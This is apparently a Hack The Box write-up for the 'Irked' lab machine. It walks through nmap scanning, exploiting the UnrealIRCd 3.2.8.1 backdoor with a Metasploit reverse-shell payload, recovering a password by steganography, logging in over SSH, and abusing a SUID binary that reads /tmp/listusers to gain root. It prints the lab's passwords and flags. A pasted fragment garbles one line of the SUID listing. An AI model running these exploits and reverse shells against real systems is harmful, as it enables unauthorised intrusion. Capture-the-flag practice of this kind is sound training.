# Irked



Hack the box : First machine :)


## In brief
- nmap : 6697 : UnrealIRCd
- nc  : Version 3.2.8.1
- msf : exploit/unix/irc/unreal_ircd_3281_backdoor
- sticky bit



## [nmap -sV -A -p- 10.10.10.117]
````
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-16 17:46 CET
Nmap scan report for 10.10.10.117
Host is up (0.062s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          53702/tcp  status
|_  100024  1          56336/udp  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
53702/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=1/16%OT=22%CT=1%CU=41929%PV=Y%DS=2%DC=T%G=Y%TM=5C3F631
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=110%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   45.60 ms 10.10.12.1
2   37.76 ms 10.10.10.117

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 791.59 seconds
````

<br>



## [80: http:10.10.10.117:80]
<img src=irked.jpg height="200" width="200">
<br>
<b>IRC is almost working!</b>

<br>


## Nc 10.10.10.117 6697 : Get some irc infos
````
root@ZenStation:~/irked# nc 10.10.10.117 6697
:irked.htb NOTICE AUTH :*** Looking up your hostname...
NICK bob
US:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
ER bob * * :bob
:irked.htb 001 bob :Welcome to the ROXnet IRC Network bob!bob@10.10.13.29
:irked.htb 002 bob :Your host is irked.htb, running version Unreal3.2.8.1
[...]
````

<span style="color:red">Version is : Unreal3.2.8.1</span>






## msfconsole : exploit/unix/irc/unreal_ircd_3281_backdoor
````
msfconsole
msf > search unreal 3.2.8.1
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                        Disclosure Date  Rank       Description
   ----                                        ---------------  ----       -----------
   exploit/linux/games/ut2004_secure           2004-06-18       good       Unreal Tournament 2004 "secure" Overflow (Linux)
   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  UnrealIRCD 3.2.8.1 Backdoor Command Execution
   exploit/windows/games/ut2004_secure         2004-06-18       good       Unreal Tournament 2004 "secure" Overflow (Win32)


msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads

Compatible Payloads
===================

   Name                                Disclosure Date  Rank    Description
   ----                                ---------------  ----    -----------
   cmd/unix/bind_perl                                   normal  Unix Command Shell, Bind TCP (via Perl)
   cmd/unix/bind_perl_ipv6                              normal  Unix Command Shell, Bind TCP (via perl) IPv6
   cmd/unix/bind_ruby                                   normal  Unix Command Shell, Bind TCP (via Ruby)
   cmd/unix/bind_ruby_ipv6                              normal  Unix Command Shell, Bind TCP (via Ruby) IPv6
   cmd/unix/generic                                     normal  Unix Command, Generic Command Execution
   cmd/unix/reverse                                     normal  Unix Command Shell, Double Reverse TCP (telnet)
   cmd/unix/reverse_bash_telnet_ssl                     normal  Unix Command Shell, Reverse TCP SSL (telnet)
   cmd/unix/reverse_perl                                normal  Unix Command Shell, Reverse TCP (via Perl)
   cmd/unix/reverse_perl_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via perl)
   cmd/unix/reverse_ruby                                normal  Unix Command Shell, Reverse TCP (via Ruby)
   cmd/unix/reverse_ruby_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via Ruby)
   cmd/unix/reverse_ssl_double_telnet                   normal  Unix Command Shell, Double Reverse TCP SSL (telnet)

msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse_perl
PAYLOAD => cmd/unix/reverse_perl
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  6667             yes       The target port (TCP)


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST 10.10.10.117
RHOST => 10.10.10.117
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6697
RPORT => 6697
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 10.10.13.29
LHOST => 10.10.13.29

msf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[*] Started reverse TCP handler on 10.10.13.29:4444
[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
[*] 10.10.10.117:6697 - Sending backdoor command...
[*] Command shell session 2 opened (10.10.13.29:4444 -> 10.10.10.117:34709) at 2019-01-17 18:03:19 +0100

id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
````
<span style="color:red">shell as ircd</span>



## [shell as ircd]
````
ls /home
djmardov
ircd

ls -al /home/djmardov/Documents
total 16
drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
drwxr-xr-x 18 djmardov djmardov 4096 Nov  3 04:40 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt

cat /home/djmardov/Documents/.backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
````

## [Stegano on web image irked.jpg]
````
$ teghide extract -sf irked.jpg
Entrez la passphrase: UPupDOWNdownLRlrBAbaSSss
Ecriture des donnees extraites dans "pass.txt".

root@ZenStation:~/irked# cat pass.txt
Kab6h+m+bbp2J:HG
````

## [ssh as djmardov]
````
$ ssh djmardov@10.10.10.117
djmardov@10.10.10.117's password: Kab6h+m+bbp2J:HG

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jan 17 12:05:42 2019 from 10.10.15.128

djmardov@irked:~$ cat Documents/user.txt
4a66a78b12dc0e661a59d3f5c0267a8e
````


## [Priv Escalation as djmardov]

List sticky bit executables
````
find / -user root -perm -4000 -exec ls -ldb {} \;  > lst

cat lst
-rwsr-xr-- 1 root messagebus 362672 Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 9468 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 13816 Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 562536 Nov 19  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 13564 Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-rwsr-xr-x 1 root root 1085300 Feb 10  2018 /usr/sbin/exim4
-rwsr-xr-- 1 root dip 338948 Apr 14  2015 /usr/sbin/pppd
-rwsr-xr-x 1 root root 43576 May 17  2017 /usr/bin/chsh
-rwsr-sr-x 1 root mail 96192 Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 78072 May 17  2017 /usr/bin/gpasswd./go /usr/bin/passwd /bin/bash
-rwsr-xr-x 1 root root 38740 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 18072 Sep  8  2016 /usr/bin/pkexec
-rwsr-sr-x 1 root root 9468 Apr  1  2014 /usr/bin/X
-rwsr-xr-x 1 root root 53112 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 52344 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
-rwsr-xr-x 1 root root 96760 Aug 13  2014 /sbin/mount.nfs
-rwsr-xr-x 1 root root 38868 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 34684 Mar 29  2015 /bin/mount
-rwsr-xr-x 1 root root 34208 Jan 21  2016 /bin/fusermount
-rwsr-xr-x 1 root root 161584 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 26344 Mar 29  2015 /bin/umount

````
Extract strings
````


djmardov@irked:~$ find / -perm -4000 -print 2>/dev/null |  while read line; do echo "=== $line ==="; strings $line; done |grep '/tmp\|==='

=== /usr/lib/dbus-1.0/dbus-daemon-launch-helper ===
/tmp
=== /usr/lib/eject/dmcrypt-get-device ===
=== /usr/lib/policykit-1/polkit-agent-helper-1 ===
=== /usr/lib/openssh/ssh-keysign ===
/tmp/ssh-XXXXXXXXXXXX
/tmp/.X11-unix/X%u
=== /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper ===
=== /usr/sbin/exim4 ===
/tmp
%s/tmp/%lu.H%luP%lu.%s
=== /usr/sbin/pppd ===
=== /usr/bin/chsh ===
=== /usr/bin/procmail ===
/tmp
/tmp/dead.letter
=== /usr/bin/gpasswd ===
=== /usr/bin/newgrp ===
=== /usr/bin/at ===
=== /usr/bin/pkexec ===
=== /usr/bin/X ===
/tmp/.X11-unix
=== /usr/bin/passwd ===
=== /usr/bin/chfn ===
=== /usr/bin/viewuser ===
/tmp/listusers
=== /sbin/mount.nfs ===
=== /bin/su ===
=== /bin/mount ===
=== /bin/fusermount ===
=== /bin/ntfs-3g ===
/tmp
=== /bin/umount ===
````

/usr/bin/viewuser uses the file /tmp/listusers
````
cat /tmp/listusers
bash
````
Let run /usr/bin/viewuser.
````
/usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2019-01-22 02:52 (:0)
djmardov pts/0        2019-01-22 11:13 (10.10.14.5)
root@irked:~#
cd /root
root@irked:/root# cat root.txt
8d8e9e8be64654b6dccc3bff4522daf3
````


















